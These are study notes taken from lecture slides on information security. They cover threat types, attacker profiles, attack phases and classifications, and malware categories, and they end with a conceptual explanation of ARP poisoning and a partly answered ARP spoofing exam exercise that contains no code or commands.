
# Information Security: Threats and Attacks

Tags: `#security` `#threats` `#attacks` `#malware` `#network-security` `#web-security` `#application-security` `#social-engineering`

## Introduction (General Concepts)

(Based on Slides 4-5)
To effectively secure a system, it's crucial to identify potential threats. Understanding how an "enemy" might proceed allows for better defensive strategies. This document covers various information security threats, attack methodologies, common attack types, and malware.

## I. Threats

### A. Definition
*   A **threat** is a **potential cause of an incident**. It represents an event or action that, if realized, could cause **damage** to an asset (system, information, etc.).
*   It refers to an **incident likely to harm** a specific computer system or even an entire organization.
*   The concept of a threat encompasses various types of malicious actions aimed at harming a system, such as attacks, espionage, information theft, etc.

### B. Types of Threats
Threats can be broadly classified into two main categories:

1.  **Accidental Threats (Non-intentional)** (Slide 6)
    *   These threats **do not involve any premeditation** or intent to harm. They often result from errors, oversights, or unforeseen events.
    *   **Examples:**
        *   **Natural Events:** Fire, earthquake, flood, power outage.
        *   **User Error:** An employee mistakenly accessing incorrect information, mishandling equipment, accidental deletion.
        *   **Technical Failures:** Software bugs, hardware failures, other "uncontrollable" component failures.

2.  **Intentional Threats** (Slide 6)
    *   These threats rely on the **deliberate action of a third party** (a person or entity).
    *   The objective can be:
        *   **Passive:** To infiltrate and gather information without altering it (e.g., espionage).
        *   **Active:** To make modifications to the system, disrupt it, or render it unusable (e.g., sabotage, data modification).
    *   It involves an action executed by an entity with the aim of **violating the system's security**.
    *   **Examples:**
        *   **Espionage:** Illicit obtaining of confidential information.
        *   **Theft:** Obtaining information or resources (hardware or software).
        *   **Disruption:** Actions aimed at weakening the Information System (IS).
        *   **Sabotage:** Deliberate disabling of the IS.
        *   **Physical Fraud:** Recovering physical media (tapes, paper listings) to obtain information.
        *   **Illegitimate Access:** Obtaining information through unauthorized access, often via identity theft.

## II. Attacks

### A. Definition and Context (Slide 7)
*   Any computer connected to a computer network is **potentially vulnerable** to an attack.
*   An **attack** is a **malicious action** specifically intended to compromise the security of an asset (affecting its availability, integrity, or confidentiality).
*   An attack represents the **realization (concretization) of a threat**. For a threat to turn into a successful attack, it requires the **exploitation of a vulnerability** present in the target system.
*   An attack can only occur (and succeed) **if the targeted asset is affected by a vulnerability** that the attack can exploit.

### B. Prevalence of Attacks (Slide 7)
*   On the Internet, attacks occur **constantly**. Several attacks per minute are often observed on each connected machine.
*   The majority of these attacks are launched **automatically** from previously infected machines (by viruses, Trojans, worms, etc.), often without the legitimate owner's knowledge.
*   More rarely, attacks are the result of targeted and deliberate action by a **malicious entity** (individual or group).
*   It is essential to **know the main types of attacks** to better prepare for and counter them.

### C. Attack Motivations and Objectives (Slide 8)
The reasons attacks are carried out can be categorized into objectives (the technical goal) and motivations (the underlying reason).

1.  **Objectives (What the attacker wants to *do*)**
    *   **Disinform:** Spread false information.
    *   **Prevent access to a resource:** Denial of Service (DoS/DDoS) attacks.
    *   **Take control of a resource:** Compromise a system for use.
    *   **Recover information:** Theft of sensitive data, espionage.
    *   **Use the compromised system to attack another (rebound/pivot):** Obscure the true origin of the attack.
    *   **Etc.** (Other specific goals).

2.  **Motivations (Why the attacker does it)**
    *   **Revenge/Grudge:** Personal motives against a target.
    *   **Politics/Religion:** Hacktivism, cyberterrorism.
    *   **Intellectual Challenges:** Proving skills, curiosity.
    *   **Desire to harm others:** Pure malice.
    *   **Impressing others:** Seeking recognition within a community.
    *   **Information Theft:** For industrial or political espionage.
    *   **Desire for money:** Ransomware, theft of banking details, fraud.
    *   **Information Falsification:** Modifying data for personal gain or to cause harm.
    *   **Etc.** (Other personal or ideological motives).

### D. Attacker Profiles (Slides 9-10)

1.  **General Characteristics** (Slide 9)
    *   **Their technical skills:** Level of expertise in IT and security.
    *   **The time they are willing to spend to succeed:** Persistence and patience.
    *   **Their motivations:** See the previous section.
    *   **Their means/resources:** Financial, hardware, and software resources available.
    *   **Their prior knowledge of the target:** Level of intelligence gathered before the attack.

2.  **Types of Attacker Profiles (Hat Classification & Others)** (Slide 10)
    *   **Black Hat:**
        *   Disregard the law.
        *   Break into systems for their own interests (often malicious or criminal), not the owner's.
        *   Create and/or use malware (viruses, trojans, etc.).
    *   **White Hat:**
        *   Ethical hacker.
        *   Help secure systems.
        *   Their technical actions can be very similar to Black Hats (penetration testing, vulnerability research), but they act with the owner's authorization and aim to improve security.
    *   **Gray Hat:**
        *   Hybrid profile between Black Hat and White Hat.
        *   May sometimes act with the spirit of a White Hat (e.g., discover a flaw and report it) but sometimes like a Black Hat (e.g., exploit a flaw without authorization, even without severe malicious intent).
        *   Their intention isn't necessarily bad, but they might occasionally commit offenses or unethical actions.
    *   **Script Kiddies:**
        *   Often young hackers or less experienced users.
        *   Use programs, scripts, and attack tools developed by others (often found online, sometimes left by White or Black Hats).
        *   Execute these tools against target machines without necessarily understanding the internal workings of the attack or its consequences.
    *   **Hacktivist:**
        *   Use hacking skills for political or ideological purposes.
        *   Usually try to deface websites or disrupt services (DoS) to convey a message, rather than stealing data or money.
    *   **Cyber Terrorist:** (Mentioned on slide, not detailed)
        *   Uses computer attacks to cause fear, major disruption, or destruction for terrorist purposes.
    *   **Suicide Hacker:** (Mentioned on slide, not detailed)
        *   Less standardized term. Could refer to attackers acting very aggressively without concern for discovery or consequences.

### E. Attack Surface (Slide 11)

1.  **Definition**
    *   The **attack surface** is simply the **set of entry points or interaction points** through which a potential attacker can attempt to exploit a vulnerability to access or affect a system or data.
    *   The larger and more complex the attack surface, the higher the likelihood it contains exploitable vulnerabilities.

2.  **Components of the Attack Surface**
    It includes all hardware, software, networks, interfaces, and related components of an information system that can be targeted. This notably includes:
    *   **Software Attack Surface:**
        *   Operating System (OS)
        *   Applications (web, business-specific, etc.)
        *   Code (presence of vulnerabilities like buffer overflow, SQL injection...)
        *   Open network services
    *   **Network Attack Surface:**
        *   Protocols used
        *   Open ports
        *   Configuration of network devices (routers, firewalls)
        *   Wireless access (Wi-Fi)
    *   **Human Attack Surface:**
        *   Users (social engineering, phishing, errors)
        *   Administrators (configuration errors, access management)
        *   External personnel
    *   **Physical Attack Surface:**
        *   Physical access to machines, servers, premises
        *   Removable media (USB drives)
        *   Power supply (outages)
        *   Physical environment (temperature, humidity)
    *   **Other elements:** Data itself, user interfaces, APIs, etc.

<!-- Placeholder for attack surface diagram (Slide 11) -->
<!-- ![Diagram showing a hacker targeting various components: Network, Application, Data, User, Hardware, OS, Power Supply, Environment](placeholder_diagram_attack_surface.png) -->

## III. Attack Methodology (Main Phases) (Slides 12-17)

### A. Overview & Frameworks (Slide 12)
*   The methodology generally employed by attackers (hackers) to infiltrate a computer system typically involves several distinct phases.
*   The presentation shows a common 5-phase model: Reconnaissance, Scanning, Gaining Access, Maintaining Access, Covering Tracks.
*   Other structured frameworks exist, such as:
    *   **Cyber Kill Chain** (Lockheed Martin)
    *   **MITRE ATT&CK**

### B. Phase 1: Reconnaissance (Slide 13)
*   **Definition:** The phase where the attacker **gathers all possible information** (technical, human) about the target, either passively or actively.
*   **Passive Gathering:** Collecting information **without directly interacting** with the target system.
    *   Examples: Search engines, Whois databases, social networks (finding info on clients, employees), public records, DNS lookups.
*   **Active Gathering:** **Directly querying or interacting** with the target system to gather information.
    *   Goal: Identify IP addresses, discover active services, map network topology.
*   **Example Tools:** NMAP (can be active), Maltego, Hping, search engines, Shodan.

### C. Phase 2: Scanning (Vulnerability Identification) (Slide 14)
*   **Definition:** This process involves a **more in-depth investigation** based on reconnaissance findings. It helps the attacker analyze the target network or machine to **find exploitable vulnerabilities**.
*   **Three Important Steps:**
    1.  **Pre-attack Phase:** Analyzing the network to find specific information based on reconnaissance data (e.g., identifying live hosts, specific OS versions).
    2.  **Port Scanning:** Analyzing the target for information like open TCP/UDP ports, services running on those ports, and their versions.
    3.  **Information Extraction:** Gathering detailed information about live machines, OS details, network topology, routers, firewalls, servers, and potential vulnerabilities associated with discovered services/versions.
*   **Example Tools:** Nexpose, Nessus, NMAP, OpenVAS.

### D. Phase 3: Gaining Access (Slide 15)
*   **Definition:** At this stage, the attacker has the necessary information. They design a plan (network map, attack vector) and **decide how to execute the attack** to breach the system.
*   **Attack Options (Examples):**
    *   Phishing attack
    *   Man-in-the-Middle (MitM) attack
    *   Brute Force Attack
    *   Spoofing Attack
    *   Denial of Service (DoS) attack (less for *gaining* access, more for disruption)
    *   Buffer overflow exploitation
    *   Session hijacking
*   **Crucial Step:** *Regardless of the method used to get in, an attacker often needs to **increase their privilege level** to administrator/root (**Privilege Escalation**). This allows them to install necessary tools/malware, modify sensitive data, or hide their tracks effectively.*
*   **Example Tool:** Metasploit (framework containing many exploits).

### E. Phase 4: Maintaining Access (Slide 16)
*   **Definition:** This is the phase after the attacker has successfully gained initial access to the target system. The attacker tries to **maintain this access** to fulfill the ultimate goal of the attack (data exfiltration, long-term monitoring, etc.).
*   **Methods for Maintaining Access:**
    *   **Privilege Escalation:** (Often done in Gaining Access but crucial for maintaining control) Increasing privileges to the administrator level to install applications, modify/hide data.
    *   **Installing Backdoors:** Planting hidden software or configuration changes that allow easy re-entry into the system in the future, bypassing normal authentication.
    *   **Installing Rootkits:** Installing stealthy software (often at the kernel level) designed to hide the attacker's presence and activities, providing persistent, privileged access.
*   **Example Tool:** Metasploit (can be used to deploy payloads for persistence), various rootkits and backdoor tools.

### F. Phase 5: Covering Tracks (Erasing Traces) (Slide 17)
*   **Definition:** An intelligent or cautious attacker will always attempt to **erase all evidence** of their presence and actions. The goal is to ensure that, later, no one can find traces leading back to them or even detect that a compromise occurred.
*   **Methods for Covering Tracks:**
    *   Clearing system cache and browser cookies/history.
    *   Modifying registry values (Windows).
    *   Modifying, corrupting, or deleting system and application logs (event logs, authentication logs, web server logs).
    *   Deleting any emails sent or received during the attack.
    *   Closing ports that were opened for the attack (less about hiding *past* action, more about cleanup).
    *   Uninstalling all tools, scripts, and applications used during the attack.

## IV. Attack Classification (Slide 18)

Attacks can be classified in several ways to better understand their nature and origin. The presentation outlines three main axes:
*   **By Attacker Location:** Internal vs. External
*   **By Attack Nature:** Passive vs. Active
*   **By Objective:** Interception, Modification, Interruption, Fabrication

### A. By Attacker Location (Slide 19)

*   **External Attack:**
    *   Initiated from **outside the organization's security perimeter**.
    *   Carried out by an **unauthorized or illegitimate user** of the system.
    *   Generally **more difficult to achieve** initially (must bypass perimeter defenses like firewalls) BUT often **easier to detect** (logs showing external connections, firewall alerts).
*   **Internal Attack:**
    *   Initiated by an entity **within the security perimeter**.
    *   Often involves an **authorized entity** (e.g., employee, contractor) accessing system resources but **using them in an unapproved or malicious manner**.
    *   Generally **easier to achieve** (attacker is already inside, potentially with some level of trust/access) BUT often **more difficult to detect** (actions might seem legitimate initially).

<!-- Placeholder for internal/external attack diagram (Slide 19) -->
<!-- ![Diagram showing external attacker outside firewall and internal attacker inside network](placeholder_diagram_location.png) -->

### B. By Attack Nature (Slides 20-25)

1.  **Passive Attacks** (Slide 20)
    *   Attempt to **learn or make use of information** from the system **without affecting system resources** or operations.
    *   Primarily involves **listening to or monitoring transmissions** on a channel.
    *   The goal is to **intercept transmitted information**.
    *   **Two main types (detailed on Slide 21):**
        1.  **Reading Message Contents (Eavesdropping):** Capturing data sent in cleartext.
        2.  **Traffic Analysis:** Observing patterns of communication even if the content is encrypted.
    *   Characteristics: **Relatively difficult to detect** (as they don't alter data or system state), but potentially **easier to prevent** (e.g., through encryption).

    *   **Passive Attacks in Detail (Slide 21):**
        *   **a. Reading Message Contents:**
            *   Occurs when data is sent **in cleartext** (e.g., unencrypted phone calls, emails, files, web traffic).
            *   This data might contain **sensitive or confidential information**.
            *   **Prevention:** Using **encryption** makes message contents unreadable to eavesdroppers.
        *   **b. Traffic Analysis:**
            *   Even if messages are **unreadable (encrypted)**, an adversary **can still analyze traffic patterns**.
            *   They can observe:
                *   Location and identity of communicating hosts.
                *   Frequency and length of messages exchanged.
                *   Timing of communications.
            *   Usefulness: This information can be used to **infer the nature of the communication** taking place, even without knowing the exact content.

2.  **Active Attacks** (Slide 20)
    *   Attempt to **alter system resources or affect their operation**.
    *   Involve some **modification** of the data stream or the **creation** of a false stream.
    *   Actions include unauthorized and deliberate **modification, suppression, or creation** of data or system state.
    *   Result: Causes **damage or alteration** to the system's integrity or availability.
    *   Characteristics: **Detection is generally easier** (as changes occur), but detection might happen **too late** after damage is done.
    *   **Active Attacks in Detail (Slides 22-25):**
        *   **a. Masquerade (Identity Usurpation)** (Slide 22)
            *   **Definition:** This attack occurs when one entity **pretends to be a different entity**.
            *   **Mechanism:** An attacker assumes the identity of an authorized user or system component to gain unauthorized privileges or access.
            *   **Significance:** It's considered a fundamental form of active attack, often being the origin or enabling factor for other active attacks like replay, modification, and denial of service.
            *   **Example Scenario:** An attacker sends a message that appears to originate from a legitimate user (A) to another user (B).
        *   **b. Replay** (Slide 23)
            *   **Definition:** This attack is carried out in two phases:
                1.  **Passive capture** of a data unit (message, transaction).
                2.  Subsequent **retransmission** of this captured data unit to produce an unauthorized effect.
            *   **Goal:** To trick the receiving system into processing the same valid (but old) message again, leading to unintended consequences.
            *   **Example Scenario:** Capturing a legitimate bank transfer message from user A to B, where the attacker (Pirate) is the beneficiary, and then replaying it later to receive the funds again.
        *   **c. Modification of Messages** (Slide 24)
            *   **Definition:** This means that portions of a legitimate message are **altered**, or that messages are **delayed or reordered** to produce an unauthorized effect.
            *   **Mechanism:** The attacker intercepts a message, changes its content, and then forwards it to the intended recipient.
            *   **Example Scenario:**
                *   Original message: "Allow A to read confidential account files."
                *   Attacker intercepts and modifies it to: "Allow **Pirate** to read confidential account files."
                *   The modified message is then sent to the system managing access control.
        *   **d. Denial of Service (DoS)** (Slide 25)
            *   **Definition:** Prevents or inhibits the **normal use or management** of communication facilities or system resources.
            *   **Targeting:**
                *   Can target a **specific entity:** e.g., suppressing all messages directed to a particular destination.
                *   Can target the **entire network:** Disrupting the network as a whole.
            *   **Mechanisms:**
                *   Disabling the network itself.
                *   **Overloading** the network or a specific server with messages/requests to degrade performance or make it unresponsive.
            *   **Goal:** To impact the **availability** of a service or resource.

### C. By Targeted Objective (Security Property) (Slides 26-29)
This classification focuses on the primary goal the attacker aims to achieve concerning the information or system resources, aligning closely with security properties (Confidentiality, Integrity, Availability, Authenticity).

1.  **Interception** (Slide 26)
    *   **Targeted Security Property:** **Confidentiality** of information.
    *   **Definition:** The attacker **intercepts information** circulating on the network, thereby gaining **unauthorized access** to it.
    *   **Impact:** Involves **reading** data but **not modifying** it. No changes are made to the system state itself (though confidentiality is breached).
    *   **Examples:**
        *   Eavesdropping on communications (like phone calls, network traffic) to capture data.
        *   Unauthorized copying of files or programs.
    *   **Techniques:**
        *   **Sniffing:** Capturing network packets.

2.  **Modification** (Slide 27)
    *   **Targeted Security Property:** **Integrity** of data.
    *   **Definition:** The attacker gains **unauthorized access** to a resource (data, program) and **alters** it.
    *   **Impact:** Data or system behavior is changed without authorization.
    *   **Examples:**
        *   Altering a program so it behaves differently (e.g., inserting malicious code).
        *   Deleting specific files on a server.
        *   Modifying the content of messages transmitted over the network (as seen in Active Attacks).
    *   **Techniques:**
        *   **Malware** (viruses, worms, trojans) often perform modifications.
        *   Direct alteration of database records.
        *   Modifying packets in transit.
    <!-- Placeholder for Modification diagram (Slide 27) -->
    <!-- ![Diagram showing normal flow Source -> Destination, with Attacker intercepting and altering the flow before it reaches Destination](placeholder_diagram_mod.png) -->

3.  **Interruption** (Slide 28)
    *   **Targeted Security Property:** **Availability** of resources.
    *   **Definition:** This attack aims to make resources **unusable or inaccessible** to legitimate users.
    *   **Impact:** Blocks transmitted messages, destroys resources, or renders systems non-functional.
    *   **Examples:**
        *   Destruction of a hard drive.
        *   Cutting a communication line.
        *   Disabling a file management system.
        *   Denial of Service (DoS) attacks.
    *   **Techniques:**
        *   **Flooding:** Overwhelming a target with traffic (network floods, SYN floods).
        *   **Smurf Attack:** A type of DDoS attack using ICMP echo requests.
        *   **Buffer Overflow:** Can sometimes crash a service, making it unavailable.
        *   Physical destruction.
    <!-- Placeholder for Interruption diagram (Slide 28) -->
    <!-- ![Diagram showing flow from Source blocked before reaching Destination](placeholder_diagram_interruption.png) -->

4.  **Fabrication** (Slide 29)
    *   **Targeted Security Property:** **Authenticity** of entities and information.
    *   **Definition:** The attacker **inserts counterfeit objects** (new information, fake messages) into the system in an unauthorized manner.
    *   **Impact:** Creates false data or impersonates legitimate entities, undermining trust in the system's information or communication partners.
    *   **Examples:**
        *   Inserting spurious (fake) messages into a network.
        *   Adding unauthorized records to a file or database.
        *   Impersonating a user to send fraudulent emails.
    *   **Techniques:**
        *   **IP Spoofing:** Creating IP packets with a forged source IP address.
        *   **ARP Spoofing:** Sending fake ARP messages to associate the attacker's MAC address with the IP address of a legitimate host (leads to MitM or DoS).

## V. Malware (Slides 30-41)

### A. Malware Introduction (Slide 30)
*   **Definition:** Malware is short for **"Malicious Software"**. It refers to any software intentionally designed to cause disruption to a computer, server, client, or computer network, leak private information, gain unauthorized access to information or systems, deprive users access to information, or which unknowingly interferes with the user's computer security and privacy.
*   **Conditions for a program to be malware:**
    *   The program is **hostile or intrusive**.
    *   The program is designed to **install itself on your computer without your consent**.
*   **Purpose:** Malware is used or created to disrupt computer operation, gather sensitive information, or gain access to private computer systems.
*   **General Term:** "Malware" is a general term used to describe a variety of forms of hostile or intrusive software.

### B. Malware Categorization (Slide 31)
While there are many ways to categorize malware, they can primarily be classified based on three key mechanisms:
1.  **Propagation Mechanism:** How the malware spreads (e.g., network, email, website, removable media).
2.  **Triggering Mechanism:** What causes the malware to activate or execute its payload (e.g., a specific date, a user action, the execution of a specific program).
3.  **Payload:** The actions performed by the malware once it has successfully infected a victim's machine (e.g., data theft, encryption, system damage, creating a backdoor).

### C. Virus (Slide 32)
*   **Definition:** A computer virus is a piece of code (a portion of a program) that **replicates by inserting copies of itself into other legitimate programs** (the "host" programs).
*   **Infection:** A program containing a virus is called an infected program.
*   **Execution:** When the infected program is executed, the virus code is also executed, allowing it to potentially infect other programs and deliver its payload.
*   **Dependency:** Viruses require a host program to function and spread; they cannot exist independently.
*   **Types of Viruses:**
    *   **Boot Sector Virus:** Infects the master boot record (MBR) or boot sector of a storage device.
    *   **File Virus:** Infects executable files (.exe, .com, etc.).
    *   **Macro Virus:** Infects files containing macros, typically documents (e.g., Microsoft Word or Excel files).
    *   **Polymorphic Virus:** Changes its code signature upon replication to evade detection by antivirus software.

### D. Worm (Worms) (Slide 33)
*   **Definition:** A computer worm is a **standalone malicious program that replicates itself** to spread to other computers, often using a computer network.
*   **Autonomy:** Unlike a virus, a worm **does not need to attach itself to an existing program** (it doesn't require a host). It propagates as an independent entity.
*   **Propagation:** Often exploits vulnerabilities in operating systems or applications to spread automatically, usually without human interaction (beyond potentially initiating the first infection).
*   **Payload:** Many worms are designed solely to propagate and may not attempt to change the systems they pass through. However, worms can also carry malicious payloads, for example:
    *   Sending multiple requests to a web server to saturate it (DoS).
    *   Spying on the host computer.
    *   Creating a backdoor for attackers.
    *   Destroying data on the infected computer.

### E. Logic Bomb (Slide 34)
*   **Definition:** A logic bomb is a piece of code intentionally inserted into a software system that will **set off a malicious function when specified conditions are met** (the trigger). It remains dormant until that trigger occurs.
*   **Installation:** Often deliberately installed, sometimes by an authorized user (like a disgruntled employee).
*   **Trigger:** The condition could be a specific date or time, the presence or absence of certain files, a particular user logging in, or a specific sequence of events.
*   **Detection:** Logic bombs are **difficult to detect** before they trigger because they remain inactive.
*   **Implications:**
    *   Highlights the need for **separation of duties** and code reviews.
    *   Reinforces the necessity for regular, reliable **backups**.

### F. Trojan Horse (Slide 35)
*   **Definition:** A Trojan horse (or Trojan) is a type of malware that **disguises itself as a legitimate or useful program** but contains hidden malicious functionality (the payload).
*   **Mechanism:** It relies on **social engineering** to trick users into executing it. The user must typically copy, download, or install the Trojan voluntarily, believing it to be something harmless or desirable.
*   **Replication:** Unlike viruses and worms, Trojans **are generally not capable of replicating themselves**.
*   **Analogy:** Named after the ancient Greek story of the wooden horse used to invade Troy. The "Visible action" is something useful or benign, while the "Invisible action" is malicious.
<!-- Placeholder for Trojan Horse diagram (Slide 35) -->
<!-- ![Diagram illustrating a Trojan Horse with visible useful function and hidden malicious payload](placeholder_diagram_trojan.png) -->

### G. Spyware (Spy Software) (Slide 36)
*   **Definition:** An application **installed (often unintentionally) on a computer to monitor user activity** and transmit this information to a third party without the user's consent or knowledge.
*   **Activities:** Spyware can perform a wide range of activities, including:
    *   **Recording keystrokes** (commonly known as a **Keylogger**).
    *   Capturing screenshots.
    *   Monitoring websites visited.
    *   Collecting personal information (usernames, passwords, credit card numbers).
    *   Redirecting web browsers.

### H. Adware (Slide 37)
*   **Definition:** Software designed to **display advertisements** on a user's screen, typically within a web browser or as pop-ups.
*   **Installation:** Often installed discreetly in the background when downloading other (often free) software, sometimes without clear permission or bundled deceptively.
*   **Impact:** While often harmless in terms of system damage, adware can be **annoying** to the user, slow down the computer, and potentially track browsing habits for targeted advertising. Some adware can border on spyware.

### I. Keylogger (Keystroke Logger) (Slide 38)
*   **Definition:** A keylogger records **every keystroke** made on a computer's keyboard, often without the user's authorization or knowledge.
*   **Purpose:**
    *   **Legitimate Uses:** Can be used as a professional IT monitoring tool (e.g., by employers monitoring company computers, with disclosure).
    *   **Criminal Uses:** Commonly used to capture sensitive information such as usernames, passwords, credit card numbers, personal messages, etc.
*   **Type:** Often considered a specific type of spyware.

### J. Backdoor (Slide 39)
*   **Definition:** An application or modification that allows **remote, unauthorized access** to a computer system, bypassing normal security mechanisms (like authentication).
*   **Control:** Gives the attacker near-total control over the compromised system, allowing them to perform a wide range of actions (monitor, interfere, intercept, modify, capture data, execute commands, etc.).
*   **Purpose:** Used to **bypass existing security controls**. Can be part of the original software (intentionally or unintentionally left by developers) or planted by attackers after gaining initial access.
*   **Benefit to Attacker:** Provides **persistent, privileged access** to a system once it has been initially compromised.
*   **Replication:** Backdoors are generally standalone malware types that **do not replicate** themselves.

### K. Ransomware (Slide 40)
*   **Definition:** A category of malware (like Cryptolocker) that aims to **encrypt the victim's data** (files, documents, databases) and then **demand a ransom** (payment, usually in cryptocurrency) in exchange for the decryption key needed to recover the data.
*   **Impact:** Makes data inaccessible to the user, potentially causing significant disruption or data loss if no backups are available or the ransom isn't paid (and even if paid, decryption isn't guaranteed).
*   **Propagation:**
    *   Primarily spreads through **phishing emails** (malicious attachments or links).
    *   Can also spread via **infected USB drives**, exploitation of **vulnerable systems exposed to the internet**, or as an **internal threat** within an organization.
<!-- Placeholder for Ransomware screenshot/diagram (Slide 40) -->
<!-- ![Image showing a typical ransomware demand screen](placeholder_diagram_ransomware.png) -->

### L. Rootkit (Slide 41)
*   **Definition:** A (set of) program(s) used to **modify the standard functionality of the operating system** in order to **hide malicious activity** carried out by the attacker or other malware.
*   **Mechanism:** They often replace common system utilities (like `kernel` components, `netstat`, `ls`, `ps` in Unix/Linux, or core system files/APIs in Windows) with modified versions. These altered utilities filter out information related to the attacker's presence (processes, files, network connections) before displaying results to the user or administrator.
*   **Goal:** To **mask the fact that a system has been compromised**, allowing the attacker to gain and maintain **root-level (administrator) access** persistently and stealthily. They can potentially spread to other machines on the network.
*   **Components:** A rootkit can be composed of various malicious components, including:
    *   Spyware elements (traffic/keystroke monitoring).
    *   Backdoors for continued access.
    *   Log file modifiers/cleaners to erase traces.
    *   Tools to attack other machines on the network.
    *   Mechanisms to modify existing system tools to evade detection.

## VI. Network Attacks

### A. ARP Poisoning (ARP Spoofing) (Slides 43-48 from full deck, matching slides 39-44 from `ARP Spoofing.md` source)

1.  **ARP Protocol Principle** (Slide 43 / File 4 Slide 39)
    *   **Definition:** ARP (Address Resolution Protocol) is a communication protocol used for discovering the **Link Layer address (e.g., MAC address)** associated with a given **Internet Layer address (e.g., IPv4 address)**.
    *   **Purpose:** When a device needs to send a packet to another device on the *same local network* for which it knows the IP address but not the physical (MAC) address, it uses ARP to find the corresponding MAC address.
    *   **Simplicity & Security:** ARP is a very simple protocol and crucially, it **does not implement any security measures**. It inherently trusts the ARP messages received on the network. This lack of authentication is what makes ARP Poisoning possible.

2.  **ARP Principle: Request / Reply** (Slide 44 / File 4 Slide 40)
    Illustrates the standard ARP process:
    1.  **Scenario:** Host A (e.g., 192.168.1.1, MAC aaaa:...) wants to send to Host B (e.g., 192.168.1.2) on the same LAN, but A doesn't know B's MAC.
    2.  **ARP Request:** Host A broadcasts an **ARP Request**: "Who has IP 192.168.1.2? Tell MAC aaaa:...".
    3.  **ARP Reply:** Host B (IP 192.168.1.2, MAC bbbb:...) sends a unicast **ARP Reply** to A: "192.168.1.2 is at MAC bbbb:...".
    4.  **ARP Cache Update:** Host A updates its **ARP cache** with `192.168.1.2 -> bbbb:...`.
    5.  Host B might also cache A's info from the request.
    <!-- Placeholder for ARP Request/Reply Diagram (Slide 44 / File 4 Slide 40) -->

3.  **ARP Principle: Gratuitous ARP (Reply)** (Slide 45 / File 4 Slide 41)
    *   **Definition:** A Gratuitous ARP is an ARP message (usually an ARP Reply, but sometimes an ARP Request for its *own* IP) that is sent **without being requested**.
    *   **Mechanism:** A host broadcasts an ARP message with its own IP/MAC mapping.
    *   **Legitimate Uses:**
        *   **Announce Presence/Update Caches:** On boot-up or IP/MAC change.
        *   **IP Conflict Detection:** Sending a Gratuitous ARP for an IP; if another device replies, conflict detected.
    *   **Slide Example:** Host A sends Gratuitous ARP for 192.168.1.1 at MAC aaaa:..., other hosts update their caches.
    <!-- Placeholder for Gratuitous ARP Diagram (Slide 45 / File 4 Slide 41) -->

4.  **ARP Poisoning** (Slides 46-48 / File 4 Slides 42-44)
    *   **a. Definition & Goal** (Slide 46 / File 4 Slide 42)
        *   ARP cache poisoning (ARP spoofing) is a common attack against the ARP protocol.
        *   Attackers **trick a victim** into accepting **falsified IP-to-MAC mappings** by sending malicious ARP messages.
        *   **Consequence:** Redirection of victim's traffic to attacker, enabling Man-in-the-Middle (MitM) or DoS.
    *   **b. Principle** (Slide 46 / File 4 Slide 42)
        *   Attacker impersonates another machine at Layer 2 within the same LAN.
        *   Aims to poison target's ARP cache.
        *   Associates attacker's MAC (`@MAC=pirate`) with IP of spoofed machine (`@ip src = machine spoofée`).
    *   **c. Methods** (Slide 46 / File 4 Slide 42)
        *   Sending ARP Reply without prior Request (Abusing Gratuitous ARP).
        *   Sending a Forged ARP Request (sender's IP/MAC forged).
        *   Sending a Forged ARP Reply (replying to legitimate request with attacker's MAC).
        *   Malicious ARP: Source IP = impersonated machine's IP, Source MAC = attacker's MAC.
    *   **d. Attack Illustration** (Slide 47 / File 4 Slide 43)
        1.  Attacker (Host C, MAC cccc:...) sends forged ARP replies:
            *   To Host A: "ARP reply: 192.168.1.2 (Host B's IP) is at cccc:... (Attacker's MAC)"
            *   To Host B: "ARP reply: 192.168.1.1 (Host A's IP) is at cccc:... (Attacker's MAC)"
        2.  Cache Poisoning:
            *   Host A's ARP table: `192.168.1.2 -> cccc:...`
            *   Host B's ARP table: `192.168.1.1 -> cccc:...`
        <!-- Placeholder for ARP Poisoning Attack Diagram (Slide 47 / File 4 Slide 43) -->
    *   **e. Consequence: Man-in-the-Middle** (Slide 48 / File 4 Slide 44)
        1.  Traffic Redirection: When A sends to B (192.168.1.2), it uses attacker's MAC (cccc:...). Same for B to A.
        2.  MitM Position: Attacker C receives all traffic between A and B.
        3.  Attacker Capabilities: Eavesdrop, modify, block, or forward traffic.

5.  **ARP Spoofing Lab Exercise (Based on Exam Paper TD N°3, Exercice 02)**
    *   **a. Network Diagram Overview (from exam paper):**
        *   Network 1 (LAN A): 192.168.1.0/24. Hosts A (192.168.1.1, AA:..:AA), B (192.168.1.2, BB:..:BB), C (192.168.1.3, CC:..:CC). Connected to Sw1.
        *   Router R1: eth0 (192.168.1.255, R10:..:R10) connected to Sw1; eth1 (192.168.2.255, R11:..:R11) connected to Sw2.
        *   Network 2 (LAN D): 192.168.2.0/24. Hosts D (192.168.2.1, DD:..:DD), E (192.168.2.2, EE:..:EE), F (192.168.2.3, FF:..:FF). Connected to Sw2.
    *   **b. Q1: What is the role of the ARP protocol? Explain how ARP tables are updated?**
        *   ARP resolves an IP address to a MAC address on a local network segment.
        *   ARP tables are updated when a host receives an ARP reply to its request, or by learning from ARP requests it observes (sender's IP/MAC). Gratuitous ARPs also update caches.
    *   **c. Q2: What frames can machine C sniff? Explain?**
        *   Machine C (192.168.1.3) connected to Sw1 can sniff:
            *   Broadcast frames on the 192.168.1.0/24 segment.
            *   Unicast frames addressed to its own MAC address (CC:..:CC).
            *   If Sw1 is a simple hub (unlikely for "Sw") or in promiscuous mode on a managed switch with port mirroring, it could see more. Assuming a standard switch, it sees broadcasts and frames to/from itself.
            *   After successful ARP poisoning, C can sniff redirected traffic.
    *   **d. Q3: What is the principle of the ARP spoofing attack?**
        *   An attacker sends forged ARP messages to a victim (or victims) on the local network. These messages associate the attacker's MAC address with the IP address of a legitimate host (e.g., another host or the default gateway). This poisons the ARP cache of the victim(s), causing them to send network traffic intended for the legitimate host to the attacker instead.
    *   **e. Q4: Which machines can launch an ARP spoofing attack on the network connected to interface 0 (eth0) of router R1? Explain?**
        *   Router R1's eth0 interface (192.168.1.255) is on the 192.168.1.0/24 network.
        *   Any machine on this same Layer 2 segment can launch an ARP spoofing attack targeting other devices on this segment or R1's eth0 itself.
        *   These machines are: Host A (192.168.1.1), Host B (192.168.1.2), and Host C (192.168.1.3).
    *   **f. Scenario: Machine C wants to intercept all traffic circulating on the network connected to eth0 (192.168.1.0/24) using ARP spoofing.**
        *   This is a broad goal. Let's refine based on subsequent questions focusing on specific interactions. For intercepting traffic between A and B, C would poison A's cache about B, and B's cache about A. For A's internet traffic, C would poison A's cache about R1, and R1's cache about A.
    *   **g. Q5: Give the state of the ARP tables of machines B and R1 (eth0) before the attack?**
